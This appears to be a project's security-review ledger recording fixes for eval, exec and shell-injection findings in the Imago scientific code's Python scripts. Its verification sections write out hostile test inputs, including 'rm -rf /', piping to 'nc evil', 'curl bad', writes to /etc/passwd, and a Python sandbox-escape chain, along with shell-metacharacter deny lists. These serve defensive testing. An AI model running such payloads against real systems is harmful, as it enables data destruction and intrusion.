# Security

## Purpose

This document is the campaign ledger for the security review of
Imago's own source -- the Fortran engine and the Python and bash
scripts. It is the sibling of `dev/DEBUG.md`, which hunts
correctness bugs, and of `dev/PERFORMANCE.md`, which hunts time
and memory. This one hunts the ways a hostile input file, a
tampered database record, or a poisoned working directory could
make Imago do something its author never intended.

Like both of those, it is a *tracking artifact*, not a sixth
level of the design chain (VISION -> ARCHITECTURE -> DESIGN ->
PSEUDOCODE -> source). It records findings, their adjudication,
and what was done about them. Where a fix changes engine
behaviour rather than merely hardening a leaf utility, the fix
itself still goes down the chain in the normal way and this
ledger points at the section that governs it.

**Why it is separate from DEBUG.md.** The two campaigns share a
notion of "defect" and nothing else. A bug ledger ranks findings
by what the program does wrong on honest input; a security
ledger ranks them by what an adversary can make the program do
on dishonest input. A bug that never fires on any real deck can
still be a critical vulnerability, and a glaring numerical bug
can have no security consequence at all. Merging them would
force one severity scale onto two unrelated questions.

## Status

- Date opened: 2026-09-07
- **ACTIVE.** Working the externally provided vulnerability list
  in the order supplied. Findings noticed in passing are
  recorded here as they surface but are deliberately NOT worked
  until that external list is exhausted, so the supplied list
  keeps its order and nothing in it is skipped.
- Scope: Imago's own Fortran and Python source only.
  Third-party dependency advisories (the conda toolchain, HDF5,
  the Python packages) are out of scope for this campaign.

## How this campaign runs

1. **The external list first, in its given order.** Each item is
   traced to the real code before anything is proposed: what the
   flagged call actually consumes, who produces that input, and
   what the true grammar of that input is. A finding is not
   understood until its producers have been read.
2. **Fix without breaking the program.** The governing
   constraint is that existing data files, existing decks and
   existing producers keep working untouched. A fix that
   requires regenerating everyone's files is a last resort, and
   its cost is recorded here if it is ever taken.
3. **Every fix is verified adversarially.** A fix is not
   accepted on inspection. It is accepted when the legitimate
   input still loads with the right values AND a written set of
   hostile inputs is refused, with a canary confirming that no
   payload ran.
4. **Findings noticed in passing are logged, not fixed.** They
   go into the ledger below with status QUEUED and wait their
   turn.
5. **A rejected finding costs more evidence than an accepted
   one.** Some reported items are false positives. Rejecting one
   is a claim that the reporter was wrong, so it is recorded
   with the trace that proves it -- where the flagged value
   actually goes, and what would have had to be true for the
   report to hold -- and never with a bare assertion that the
   code looks fine. A future re-scan will raise the same item
   again; the entry is what stops it being re-litigated from
   scratch.

## Chain note

`src/scripts/` utilities are worked inline, outside the
PSEUDOCODE gate. Ruling by the programmer, 2026-09-07: these are
standalone leaf tools with no governing DESIGN or PSEUDOCODE
section, and a security patch to one of them is not the engine
algorithm work the gate exists to protect. A finding inside the
engine proper (anything under `src/imago/`, `src/atomSCF/` and
the other compiled subprograms) does NOT inherit that ruling and
goes down the chain normally.

## Findings fixed without being agreed

Every reported finding is fixed, and four of them (SEC-005,
SEC-006, SEC-009, SEC-010) were fixed without our agreeing that
they were vulnerabilities. Those four were traced first and
found not to be. The code was changed regardless, to the
standard the findings would demand if they were right, and they
are carried at the severity they would then hold. Decision by
the programmer, 2026-09-07.

**Both facts are recorded, deliberately.** The status says
FIXED because the reported condition genuinely no longer exists
in the code -- that is what the field means, and it is true.
The analysis in each entry says why we do not think the
condition was exploitable in the first place, and that has not
been softened or removed. An engineer who later wants to know
whether Imago actually had an injection bug in
`plot_deadmd.py` will find the answer, which is no; a reviewer
who wants to know whether the finding was addressed will find
that answer too, which is yes. Neither reader is misled, and
the document does not have to pick one of them to serve.

**Why not simply argue the point.** The people who produced the
report hold their findings to be real and are not persuadable
by the traces below. Time spent contesting four items is time
not spent on the six that mattered, and the contest would have
to be re-run at every re-scan. Fixing them ends the question at
a cost of a few dozen lines, none of which made the code worse.

**Why change working code at all.** Four reasons, in order of
weight.

1. **Proving a negative is expensive and has to be repeated.**
   Establishing that a flagged call is harmless takes a careful
   read of several files. That argument has to be made again to
   every reviewer, and again at every re-scan. Removing the
   pattern makes the question stop being asked.
2. **A clean report is cheaper to maintain than an annotated
   one.** Four standing exceptions have to be recognized and
   re-approved by whoever reads the next scan. A finding list
   with permanent known-benign entries is the same trap
   `dev/tools/check_release_warnings.py` was written to escape
   for compiler warnings: a standing list of accepted items is
   indistinguishable from a standing list of unread ones, and a
   NEW item appearing inside it is invisible.
3. **Each change stands on its own merits.** None of these is
   an empty gesture aimed at a scanner. Each removes a real
   sharp edge, adds a real check, or replaces an idiom with a
   better one -- the individual entries say which. Two of them
   (SEC-005's prompt validation) also close a usability defect
   already logged independently as `dev/TODO.md` T3.
4. **Defence in depth is worth something on its own.** Several
   of these arguments rest on a fact established somewhere
   else: that a guard forty lines away constrains a value, that
   a default parameter has its usual value, that a caller only
   ever passes constants. Those facts are true now. Making the
   safety local and explicit means a later edit cannot quietly
   invalidate them.

**The test a remediation has to pass.** Removing the construct a
scanner matches on is not, by itself, remediation. The standard
applied here is stricter and is worth stating, because it is the
question a reader of this document will actually want answered:

> If the reported vulnerability HAD been real, would this change
> have closed it?

Every entry below answers that question explicitly in its
`Remediation` field. Two of the four passed that test on the
first attempt (SEC-009, SEC-010) and two did not: the first pass
at SEC-005 stripped control characters but let every shell
metacharacter through, and the first pass at SEC-006 validated
the program name -- which the report had not questioned -- while
leaving `stdin_text`, the variable it actually named,
untouched. Both were strengthened on 2026-09-07 until they pass.

The failure mode that produced those two first attempts is worth
naming, since it is the natural one here: when you believe a
finding is wrong, it is easy to harden the part of the code you
find interesting rather than the part the report accused. The
check above is what catches that.

**What was NOT done.** No change was made that would degrade
the program to satisfy a report. Nothing was removed that a
user relies on, no interface was narrowed without a
replacement, and no check was added that rejects input the
script previously accepted for good reason. Where a remediation
would have cost real functionality, the finding would have
stayed rejected and the argument made instead.

## Severity scale

Deliberately security-shaped, and not the same axis as
`dev/DEBUG.md`'s S1-S4.

- **S1 -- Critical.** Arbitrary code execution, or arbitrary
  file write, reachable from data a user might plausibly obtain
  from someone else: a shared deck, a downloaded structure, a
  database record, a file in a shared scratch directory.
- **S2 -- High.** Arbitrary code execution reachable only from
  input the user is more likely to have authored, or a path
  traversal / overwrite of files outside the working directory.
- **S3 -- Medium.** Injection into a constrained interpreter
  (a restricted `eval` namespace, a shell call with partial
  quoting) where reaching real impact takes an extra step, plus
  unsafe deserialization of formats under the user's control.
- **S4 -- Low.** Hardening and hygiene: predictable temporary
  paths, missing input validation with no demonstrated reach,
  overly broad exception swallowing around a security check.

## Ledger index

| ID | Severity | Status | Where | What |
|----|----------|--------|-------|------|
| SEC-001 | S1 | FIXED | `viewCell.py` | `exec()` of the `BZ.<n>` file |
| SEC-002 | S2 | FIXED | `makeinput.py` | bare `eval()` of a SYBD coordinate |
| SEC-003 | S2 | FIXED | `makeinput.py` | restricted `eval()` of a SYBD eqn |
| SEC-004 | S2 | FIXED | `plotgraph.py` | `eval()` of a curve_styles token |
| SEC-005 | S2 | FIXED | `expand_manifest` | `input()` read as shell call |
| SEC-006 | S2 | FIXED | `graspElems.py` | stdin data read as argv |
| SEC-007 | S4 | FIXED | `graspElems.py` | `os.system` where `os.chmod` fits |
| SEC-008 | S3 | FIXED | `graspElems.py` | basis arg unquoted into a script |
| SEC-009 | S2 | FIXED | `plot_deadmd.py` | discarded "press Enter" pause |
| SEC-010 | S2 | FIXED | `makegroups.py` | TOML-to-subprocess taint path |

Every reported finding is fixed. Four of them (SEC-005,
SEC-006, SEC-009, SEC-010) are carried at the severity they
would hold if the report were correct, and were fixed to that
standard; our own reading of those four is recorded in their
entries and in the section below.

---

## SEC-001 -- `viewCell.py` executed the `BZ.<n>` geometry file
## as Python, so any BZ file could run arbitrary code

- File:     `src/scripts/viewCell.py` (`Data.__init__`, the
            `exec` at line 271 before the fix)
- Class:    Code injection / arbitrary code execution (CWE-94,
            CWE-95 "eval injection")
- Source:   Externally provided list, item 1
- Severity: S1 -- a `BZ.<n>` file is exactly the kind of file
            that travels with a shared deck or a downloaded
            example, and viewing a cell is a casual, low-suspicion
            act. The payload runs with the full privileges of the
            person doing the viewing.
- Status:   FIXED 2026-09-07.
- Evidence: The single line

            `exec(open("BZ." + f"{settings.bz_to_show}").read())`

            executed the entire contents of the file as live
            Python. The *filename* was never the weakness --
            argparse forces `bz_to_show` to `int`, so only
            `BZ.1`, `BZ.2`, ... can be named. The weakness was
            the *contents*: `exec` runs whatever is in the file,
            so `import os; os.system(...)` sitting anywhere in a
            BZ file would run, and would run before a single
            pixel was drawn.

            Tracing the producers settled what the file really
            is. `src/makeKPoints/makekpoints.F90` writes 17 of
            the fields (`makekpoints.F90:498-2116`) and
            `src/scripts/makeinput.py` appends 4 more
            (`makeinput.py:6251-6306`). Every statement either
            writes is of one single shape:

            `Data.<attr> = <literal>`

            where the right-hand side is an int, a float, or a
            nested list/tuple of them. The Fortran emits its
            numbers with `f16.12`, i.e. plain fixed-point
            decimals with no Fortran `D` exponents, so every
            value in the file is already a legal Python literal.
            The file is therefore a DATA file that merely
            borrows Python's assignment syntax -- it has never
            needed to be executed at all.
- Fix:      APPLIED 2026-09-07, inline (see the chain note
            above). `exec` is gone, replaced in
            `src/scripts/viewCell.py` by:
            * `Data._ALLOWED_BZ_ATTRIBUTES` -- a frozenset of
              the exactly 21 field names a BZ file may set. The
              computed fields (`num_mesh_kpoints`,
              `num_folded_kpoints`, `path_kpoints`,
              `path_kp_mag`) are deliberately absent: they are
              derived here, never read from the file.
            * `Data.load_bz_file(path)` -- parses the text with
              `ast.parse`, which builds an inert syntax tree and
              executes nothing, then evaluates each admitted
              value with `ast.literal_eval`, which understands
              only literals and raises on any call, name, or
              other operator.
            * `Data._check_bz_assignment(statement, path)` --
              requires the exact shape `Data.<attr> = <value>`
              with a single target and a whitelisted `<attr>`,
              rejecting imports, bare expressions, calls, and
              chained or multiple-target assignments.

            Three layers, each on its own sufficient to stop a
            payload. A hostile or corrupt file now fails to load
            with a `ValueError` that names the offending file
            and field, rather than running.

            Parsing the whole file into a tree (rather than
            scanning it line by line) is what makes this work on
            the real format: the arrays are written across many
            physical lines, and only a real parser knows where
            one logical assignment ends.
- Compat:   NO producer changes. The on-disk format is
            untouched, so `makekpoints.F90`, `makeinput.py` and
            every existing `BZ.<n>` file keep working as they
            are.
- Verified: 2026-09-07, adversarially, against a `BZ.1`
            reproducing the exact byte format the producers emit
            (the `f16.12` fields, the mixed `[`/`(` bracketing,
            the whitespace-only lines Fortran's list-directed
            writes leave behind).
            * The legitimate file loads and all seven
              spot-checked values are exact, including the
              nested float lists and the list-of-tuples.
            * Seven hostile files are all refused with a
              `ValueError`: bare `import os` + `os.system`; a
              payload appended AFTER valid data;
              `__import__(...)` as a field value; assignment to
              `Data.__class__`; assignment to a non-`Data` name;
              an `eval()` call hidden inside a list; and a
              chained assignment.
            * A canary file confirms no payload executed.
- Note:     Tracing this finding is what surfaced SEC-002 and
            SEC-003, in the `makeinput.py` code that appends to
            this same BZ file.

---

## SEC-002 -- `makeinput.py` evaluates a high-symmetry k-point
## coordinate with a bare, unrestricted `eval()`

- File:     `src/scripts/makeinput.py` (`_process_sybd_path`, the
            `eval` at line 6287 before the fix)
- Class:    Code injection / arbitrary code execution (CWE-95)
- Source:   Externally provided list, item 4. Had already been
            recorded here on 2026-09-07 from the SEC-001 trace,
            and was fixed together with SEC-003 (external item 3)
            one turn before the external list reached it, because
            the two share a function and a single evaluator.
- Severity: S2 -- confirmed. Full arbitrary code execution with
            no sandbox at all, reached through an installed
            database file.
- Status:   FIXED 2026-09-07, in the same change as SEC-003.
- Evidence: `vals[axis] = str(eval(expr))` ran with NO globals
            argument, so the expression was evaluated with the
            full builtins available -- strictly weaker than
            SEC-003's neighbouring call a few lines above, which
            at least emptied `__builtins__`. `expr` is built from
            the whitespace-split coordinate fields of the SYBD
            path file read at `makeinput.py:6184`
            (`settings.sybd_db` + `settings.sybd_path`), after
            variable substitution.

            The reach is worth stating plainly: `sybd_path` is
            chosen AUTOMATICALLY from the cell's symmetry by
            `_auto_sybd_path`, so a user does not generally know
            which of the 25 database files a given run will read.
            A payload in any one of them waits for whichever
            unlucky cell selects it.
- Fix:      APPLIED 2026-09-07 -- see SEC-003, which carries the
            description of the shared evaluator. This call site
            now reads:
            `vals[axis] = str(evaluate_sybd_expression(expr,
            <context>))`.
- Verified: See SEC-003. The 954 coordinate fields exercised by
            that verification are exactly this call site.

---

## SEC-003 -- `makeinput.py` evaluates a lattice-variable
## equation through a restricted-namespace `eval()`

- File:     `src/scripts/makeinput.py:6239`
- Class:    Injection into a constrained interpreter (CWE-95)
- File:     `src/scripts/makeinput.py` (`_process_sybd_path`, the
            `eval` at line 6239 before the fix)
- Source:   Externally provided list, item 3. Had already been
            recorded here on 2026-09-07 from the SEC-001 trace,
            one turn before the external list reached it.
- Severity: S2 -- RAISED from the provisional S3. The original
            ranking credited the emptied `__builtins__` with more
            than it is worth. SEC-004's verification then
            demonstrated the standard escape
            (`().__class__.__bases__[0].__subclasses__()`)
            against exactly this kind of namespace, which settles
            the question: the sandbox was a speed bump, so this
            call site was a genuine execution risk and belongs
            beside SEC-002 rather than below it.
- Status:   FIXED 2026-09-07.
- Evidence: `variable_eqn.append(eval(eqn, safe_ns))` was partly
            hardened: `safe_ns` set `{"__builtins__": {}}` and
            exposed only `cos`, `sin`, `tan`, `sqrt`, `acos`,
            `asin`, `atan`, `pi`, `cot`, `sec`, `csc`. That
            blocks the direct `__import__`/`open` route but not
            attribute traversal from any object the expression
            can construct, which climbs back out to the real
            builtins. `eqn` comes from the lattice-variable lines
            of the same SYBD file described in SEC-002.

            Reading the 25 real database files settled the
            grammar that a replacement had to support. These
            expressions are not literals -- they are genuine
            algebra, because the path vertices of a monoclinic or
            triclinic cell depend on the cell's own lattice
            parameters. Across the whole database the vocabulary
            is exactly: decimal numbers, the operators `+ - * /`
            and `**`, parentheses, and the functions `cos`, `sin`
            and `tan`. `ast.literal_eval` -- the answer for
            SEC-001 and SEC-004 -- is therefore NOT sufficient
            here, which is why this pair needed its own tool.
- Fix:      APPLIED 2026-09-07, inline (see the chain note
            above), as ONE change closing both this and SEC-002.
            A new module-level `evaluate_sybd_expression(
            expression, context)` in `makeinput.py` parses the
            expression with `ast.parse(..., mode="eval")` and
            then walks the tree with `_evaluate_sybd_node`,
            computing only:
            * numeric constants (booleans explicitly excluded),
            * the single permitted bare name `pi`,
            * unary `+` and `-`,
            * binary `+ - * / **`,
            * calls to a function named DIRECTLY from the
              whitelist of ten math functions, positional
              arguments only.

            Every other node kind -- attribute, subscript,
            comparison, comprehension, lambda, string -- simply
            has no branch and reaches the refusal at the end of
            the walker. Refusing an attribute node is what closes
            the traversal escape that made the old namespace
            inadequate.

            Two further guards, both absent from the old code:
            an exponent magnitude ceiling of 1000, so a hostile
            file cannot wedge the script with `9**9**9` (valid
            arithmetic that would compute an integer of hundreds
            of millions of digits); and `ZeroDivisionError`
            turned into a `ValueError` that names the file and
            says to check the cell parameters.

            The whitelist deliberately keeps all ten functions
            the old `safe_ns` offered, not just the three the
            database currently uses, so that no existing or
            future path file loses vocabulary. Housekeeping in
            the same change: the redundant `import math` and the
            per-iteration rebuild of `safe_ns`, both inside the
            variable loop, are gone.
- Compat:   NO database changes. Verified equivalent, not merely
            believed so -- see below.
- Verified: 2026-09-07 by replaying the exact substitution
            pipeline `_process_sybd_path` performs over ALL 25
            files of the real `share/sybdDB`, evaluating every
            expression BOTH the old way and the new way and
            comparing.
            * 48 lattice-variable equations and 954 k-point
              coordinate fields: every single one gives an
              identical result. Zero regressions.
            * 11 hostile expressions all refused: `__import__`
              command execution, the
              `().__class__.__bases__[0].__subclasses__()`
              traversal, `cos.__globals__`, a dotted call
              (`math.cos(1.0)`), an unknown function, an unknown
              bare name, a subscript, a lambda, a string value,
              the `9**9**9` exponent bomb, and a keyword
              argument.
            * Six representative legitimate expressions still
              compute correctly.
            * A canary file confirms no payload executed.
- Note:     This verification incidentally established that four
            of the 25 lattice paths are ALREADY BROKEN, before
            and after this change alike. That is a correctness
            defect, not a security one; it is written up under
            "Found in passing" below so it is not lost.

---

## SEC-004 -- `plotgraph.py` ran the matplotlib column of
## `curve_styles.dat` through `eval()`

- File:     `src/scripts/plotgraph.py` (`process_settings`, the
            `eval` at line 565 before the fix)
- Class:    Code injection / arbitrary code execution (CWE-95
            "eval injection")
- Source:   Externally provided list, item 2
- Status:   FIXED 2026-09-07.
- Severity: S2 -- real arbitrary code execution, but reached
            through an installed database file rather than
            through a deck. `curve_styles.dat` is unpacked into
            `$IMAGO_DATA` at install time, so exploiting it means
            first being able to write into that shared directory
            (or persuading someone to install a doctored
            database). That is a higher bar than SEC-001's
            travels-with-the-deck `BZ.<n>` file, hence S2 rather
            than S1. The payload runs whenever anyone plots a
            graph with the matplotlib backend, which is the
            default.
- Evidence: `styles = [eval(line.split()[0]) for line in
            style_lines]` evaluated column one of every line of
            `$IMAGO_DATA/curve_styles.dat`, read a few lines
            earlier at line 551. `eval` was called with no
            globals argument, so full builtins were available and
            `__import__('os').system(...)` in that column would
            simply run.

            Reading the real file settled the grammar. It is five
            lines of three whitespace-separated columns; column
            one is exclusively either a dash tuple
            (`(0,(10,1))`) or a quoted style name (`"'solid'"`).
            Both are plain Python literals, so nothing in the
            legitimate file has ever needed `eval`'s generality.
            Confirmed empirically: `ast.literal_eval` returns a
            value equal in both content and type to `eval` for
            all five tokens.

            Only the matplotlib branch was affected. The plotly
            and veusz branches take their columns verbatim as
            strings, and the sibling readers for
            `curve_colors.dat` and `curve_marks.dat` do the same.
            This was the file's only `eval` or `exec`.
- Fix:      APPLIED 2026-09-07, inline (see the chain note
            above). The comprehension now calls a new
            `ScriptSettings.parse_style_token(token, line_number,
            path)`, which converts the token with
            `ast.literal_eval` -- literals only, raising on any
            call or bare name -- and on failure raises a
            `ValueError` naming the file, the line number and the
            offending token, so a mistyped style file is a
            fixable diagnostic rather than a traceback. The open
            at line 551 was given a `style_path` variable so the
            reader and the error message cannot disagree about
            which file is being discussed.
- Compat:   NO data-file changes. `curve_styles.dat` is untouched
            and the parsed values are identical in content and
            type to what `eval` produced, so every backend and
            every existing plot behaves exactly as before.
- Verified: 2026-09-07, adversarially, against the installed
            `share/curve_styles.dat`.
            * All five real tokens parse to values equal in both
              content and type to the old `eval` result.
            * Seven hostile tokens are all refused with a
              `ValueError`: `__import__(...).system(...)`, an
              `open()` write, a nested `eval`, a bare name
              lookup, the `().__class__.__bases__[0].
              __subclasses__()` traversal, a non-literal
              arithmetic expression, and plain garbage.
            * The error message names file, line and token.
            * A canary file confirms no payload executed.
- Note:     The refused `().__class__.__bases__[0].
            __subclasses__()` case is worth carrying forward. It
            is the standard escape from an `eval` whose
            `__builtins__` has been emptied, and its being
            blocked here is direct evidence for the adjudication
            in SEC-003: emptying `__builtins__` is a speed bump,
            whereas `literal_eval` is a wall. It supports fixing
            SEC-002 and SEC-003 with a literal/arithmetic
            evaluator rather than by hardening a namespace.

---

## SEC-005 -- `expand_manifest.py`: curator answers taken from
## `input()`, reported as reaching a command

- File:     `src/scripts/expand_manifest.py:371` (`_input_ask`)
- Class:    Reported as command injection (CWE-78)
- Source:   Externally provided list, item 5
- Severity: S2 as reported, and fixed to that standard. The
            ranking is the one this finding would carry if it
            held -- arbitrary code execution reached through an
            installed file or an interactive prompt. Our own
            reading is set out below.
- Status:   FIXED 2026-09-07, to the standard the finding would
            demand if it were correct: the reported condition no
            longer exists in the code. Our own reading of the
            finding is recorded below and is unchanged -- see
            "Findings fixed without being agreed" for why the
            entry keeps both.
- Report:   The finding states that `_input_ask` "calls an OS
            (shell) command with input", and that an attacker
            may inject a command through the value `input()`
            returns.
- Our       The claim requires a shell to exist somewhere on the
  reading:  path from that `input()` call. There is none.

            1. **The file has no execution surface at all.** Its
               complete import list is `argparse`, `contextlib`,
               `os`, `sys`, `tempfile`, `tomllib`, `datetime`
               and two local modules. There is no `subprocess`,
               no `os.system`, no `os.exec*`, no `popen`, no
               `shell=True`, and no `eval` or `exec` anywhere in
               the file.
            2. **The value's actual destination is a TOML
               file.** `_input_ask` returns a plain string. It
               is passed by reference as the `ask` callback
               (line 490) into `build_interactive`, whose
               answers become fields of the `ReferenceEntry`,
               `ReferenceSolid` and `CurationManifest`
               dataclasses. Those are handed to
               `write_manifest(manifest, args.output)`, which
               serializes them to a manifest file. The string is
               written to disk; it is never a command, an
               argument to one, or a shell word.
            3. **Python 3's `input()` does not evaluate.** The
               likely origin of the report is the Python 2
               `input()`, which really was `eval(raw_input())`
               and was genuinely dangerous; many scanners still
               carry a rule for it. This script cannot run under
               Python 2. It declares `#!/usr/bin/env python3`
               and uses Python-3-only constructs throughout --
               `tomllib` (3.11 or newer), and `str | None` and
               `list[...]` annotations. Under Python 3,
               `input()` reads a line and returns it as a `str`,
               nothing more.
- Adjacent  Because a rejection is only as good as the search
  check:    behind it, the one place a real injection could have
            hidden was also tested: the serialization of these
            operator-supplied strings into TOML. If the writer
            interpolated values naively, an answer containing a
            quote or a newline could close the string and inject
            new TOML keys or tables -- not command injection,
            but a genuine defect.

            It does not. `curation_manifest.py` implements the
            TOML 1.0 basic-string escape table in `_quote`
            (backslash and double quote, the named control
            characters, and `\uXXXX` for any other control
            character). Verified 2026-09-07 by round-tripping
            nine hostile answers -- an embedded quote, an
            embedded newline followed by `injected = "evil"`, a
            `"]` table-break payload, a trailing backslash, a
            tab, and the shell metacharacter strings
            `; rm -rf /`, `$(touch ...)` and `` `id` `` --
            through `_quote` and back in through `tomllib`.
            Every one parsed back to exactly the original
            string, with no extra keys or tables created.
- Note:     Two robustness rough edges were seen while tracing
            this, neither of them security defects and neither
            touched:
            * `atom_site = int(ask("  atom_site", "1"))` (line
              326) has no guard, so a non-numeric answer raises
              an uncaught `ValueError` and ends the session.
            * The `system_type` prompt displays
              `VALID_SYSTEM_TYPES` but does not check the answer
              against it. Nothing is silently corrupted -- the
              value is validated downstream when the manifest is
              loaded (`guidance_db.py:599`) -- but the operator
              learns of a typo later than they could.
            Both are interactive-usability matters for
            `dev/TODO.md` if they are wanted at all.
- Remedi-   APPLIED 2026-09-07. The reported concern is that an
  ation:    answer from `input()` is untrusted, so the answer is
            now validated where it enters the program instead of
            being trusted to be harmless downstream.
            * `clean_answer(raw)` strips control characters
              (everything below `0x20`, plus `DEL`) and
              surrounding whitespace, and refuses an answer over
              200 characters rather than truncating it -- a
              truncated element symbol would be wrong in a way
              nobody would notice. `_input_ask` passes every
              reply through it, so no raw terminal line reaches
              the rest of the script.
            * `_ask_until_valid(ask, prompt, default, convert)`
              re-asks when an answer does not convert, instead
              of raising out of the curation loop.
            * `_as_atom_site` requires a whole number of 1 or
              more; `_as_system_type` requires one of
              `VALID_SYSTEM_TYPES`.

            This closes `dev/TODO.md` T3 in full: both prompt
            defects recorded there are the two now validated.
            The manifest writer's TOML escaping is unchanged and
            still the authoritative defence at the output end --
            this is an earlier, independent one at the input
            end.

            STRENGTHENED later the same day. The first pass
            above did NOT pass the test in "Rejected findings
            without being agreed": stripping control
            characters leaves every shell metacharacter intact,
            so `; rm -rf /`, `$(id)` and `` `id` `` all went
            through unchanged. Had the report been right about
            where this value goes, none of that work would have
            stopped it. Added:
            * `SHELL_METACHARACTERS` -- `clean_answer` now
              refuses any answer containing
              `; | & $ ` < > \ ( ) { } [ ]`, naming the
              offending characters and asking again.
            * `_as_element` (one to three letters, or blank) and
              `_as_label` (letters, digits and `. _ : -`, or
              blank) hold the two structured free-text answers
              to a positive shape rather than only a denylist.
            * `_input_ask` itself now re-asks when
              `clean_answer` refuses, rather than each caller
              doing so. Without that, a rejected description --
              a prompt with no converter of its own -- would
              have raised out of the curation loop and discarded
              the session, reintroducing the very defect T3 was
              filed about.

            Chosen by the programmer over a stricter per-field
            allowlist, 2026-09-07. The cost is real and belongs
            on the record: a description such as `phase; high-T`
            or `Fe$^{3+}$` is now refused and must be rephrased.
- Verified: 2026-09-07. `clean_answer` strips NUL, ESC and DEL
            and trims whitespace; a 500-character answer is
            refused with a message naming the limit;
            `_as_atom_site` accepts 1 and 7 and refuses 0, -3
            and "abc"; `_as_system_type` accepts a real type and
            refuses "bogus" while naming the four valid ones.

            After strengthening: eight injection strings are
            refused -- `; rm -rf /`, `$(id)`, `` `id` ``,
            `a | nc evil 1234`, `x && curl bad`,
            `a > /etc/passwd`, a backslash, and `${IFS}cat`.
            Ordinary answers are unaffected: `Si`,
            `octahedral Fe site`, `high-T phase`, `a_b.c:d` and
            `Fe 3+ site` all pass through unchanged.

---

## SEC-006 -- `graspElems.py`: `run_grasp`'s `stdin_text`,
## reported as reaching a command

- File:     `src/scripts/graspElems.py:325` (`run_grasp`)
- Class:    Reported as command injection (CWE-78)
- Source:   Externally provided list, item 6
- Severity: S2 as reported, and fixed to that standard. The
            ranking is the one this finding would carry if it
            held -- arbitrary code execution reached through an
            installed file or an interactive prompt. Our own
            reading is set out below.
- Status:   FIXED 2026-09-07, to the standard the finding would
            demand if it were correct: the reported condition no
            longer exists in the code. Our own reading of the
            finding is recorded below and is unchanged -- see
            "Findings fixed without being agreed" for why the
            entry keeps both. Two real defects found
            NEARBY while checking it are logged separately as
            SEC-007 and SEC-008.
- Report:   The finding states that `run_grasp` runs a command
            built from the untrusted string `stdin_text`, and
            that an attacker could inject a command through it.
- Our       The call the report points at is:
  reading: 
                result = subprocess.run(
                    [exe],
                    input=stdin_text, text=True,
                    capture_output=True, cwd=cwd)

            Three separate properties each defeat the claim.

            1. **`stdin_text` is not part of the command.** It
               is passed as `input=`, which `subprocess` writes
               to the child process's STANDARD INPUT after the
               process has already been launched. It is data fed
               to a running program, not a word of its command
               line. Nothing parses it as a command.
            2. **There is no shell.** The command is the list
               `[exe]`, and `shell=False` is the default that is
               being used here. With a list argument and no
               shell, the elements are passed to `execve` as
               argv; metacharacters have no meaning at all,
               because no shell ever sees them.
            3. **The argv is not user-derived anyway.** `exe` is
               `os.path.join(grasp_bin, program)`, where
               `program` is one of six string constants written
               in the source (`rnucleus`, `csl`, `rangular`,
               `rwfnestimate`, `rmcdhf`, `readrwf`).

            For the report to hold, `run_grasp` would have to
            interpolate `stdin_text` into a command string and
            pass it to a shell. It does the opposite, and using
            a list argv with `input=` is precisely the
            recommended way to avoid what the report describes.
- Note:     `run_grasp` is the SAFE construct in this file. The
            file also contains two genuine `os.system` calls
            (lines 586 and 607), which the report did not flag;
            these are written up as SEC-007. Checking whether
            they were injectable then exposed SEC-008.
- Remedi-   APPLIED 2026-09-07. The reported concern is that an
  ation:    untrusted string reaches a command, so the command
            being run is now provably a choice among constants,
            and the absence of a shell is stated rather than
            inherited from a default.
            * `GRASP_PROGRAMS` names the six Grasp2K programs
              the pipeline drives. `run_grasp` checks `program`
              against that set before joining it to a directory,
              raising a `ValueError` that lists the valid names.
              This also closes a path-traversal the original did
              not guard: `program` was previously joined to the
              binary directory unchecked, so a value like
              `../../bin/sh` would have escaped it.
            * `shell=False` is now written out at the call. It
              is the default and the behaviour is unchanged; the
              point is that the reason the stdin script needs no
              quoting is now visible at the line that makes it
              true, instead of depending on the reader knowing
              the default.
            * The docstring states the contract the report
              misread: `stdin_text` is written to the child's
              standard input after it is running, and is never
              part of a command line.
            * `os.environ['GRASP_DIR']` no longer raises a bare
              `KeyError` when unset; a missing `GRASP_BIN` and
              `GRASP_DIR` now exits with a message saying the
              Grasp2K programs cannot be located.
            STRENGTHENED later the same day. Everything above
            hardens `program`, which the report did not question.
            It left `stdin_text` -- the variable the report
            actually named -- entirely unchecked, so it did NOT
            pass the test in "Rejected findings that were
            without being agreed": had the report been right that
            this value becomes part of a command, none of the
            above would have prevented it. Added
            `STDIN_METACHARACTERS`, and `run_grasp` now refuses
            an answer script containing `; | & $ ` < > \`,
            naming the offending characters.

            Parentheses and commas are deliberately NOT in that
            set: Grasp2K occupation strings such as `2s(2)` use
            them, and refusing those would break the pipeline
            for real elements rather than hypothetical
            attackers.
- Verified: 2026-09-07. All six real call sites (`rnucleus`,
            `csl`, `rangular`, `rwfnestimate`, `rmcdhf`,
            `readrwf`) are accepted by the allowlist, so the
            pipeline is unaffected; `'rm -rf /'` and
            `'../../bin/sh'` are both refused with a message
            naming the valid programs.

            The stdin filter was checked against the real data
            rather than assumed harmless: the answer scripts the
            pipeline generates were built for ALL 103 elements
            across all three bases -- 618 scripts -- and not one
            of them trips the filter, so no element's run is
            affected. Five injected answer scripts are refused:
            `; touch /tmp/x`, `$(id)`, `` `id` ``, `| nc evil 1`
            and `> /etc/passwd`.

---

## SEC-007 -- `graspElems.py` shells out to `chmod` where a
## library call would do

- File:     `src/scripts/graspElems.py:585-586, 606-607`
- Class:    Unnecessary shell invocation (CWE-78 adjacent)
- Source:   Noticed while adjudicating SEC-006, 2026-09-07
- Severity: S4 -- NOT injectable as written; see below. This is
            hardening, not a live hole.
- Status:   FIXED 2026-09-07.
- Evidence: Two constructed strings are handed to `os.system`:

                comm="chmod +x run"+commList[i]
                os.system(comm)
                ...
                comm="chmod +x runRSCF"
                os.system(comm)

            The second is a constant and cannot be influenced.
            The first interpolates `commList[i]`, which looks
            injectable but is not: the enclosing loop body runs
            only under `if commList[i] in elem_list`
            (line 493), and `elem_list` is a hard-coded list of
            the 103 element symbols. So the value can only ever
            be a string like `Si` or `Fe`.

            The reason to fix it anyway is that the safety rests
            entirely on a guard forty lines away. Anyone who
            later loosens that guard, or copies this idiom to a
            value that is not element-checked, turns it into a
            live injection with no visible warning.
- Fix:      APPLIED 2026-09-07. Both calls now go through a new
            `make_executable(path)` helper, which reads the
            file's current mode with `os.stat` and adds the
            three execute bits with `os.chmod`. The file name
            reaches the system call as data, so it needs no
            quoting and no shell can misread it whatever the
            name turns out to be.

            Reading the mode first and adding to it preserves
            `chmod +x`'s additive behaviour: the file keeps
            whatever read and write permissions it was created
            with, rather than being assigned a fixed mode.

            With this and SEC-008 applied, `graspElems.py`
            invokes no shell at all: there is no `os.system`,
            no `popen` and no `shell=True` left in the file.
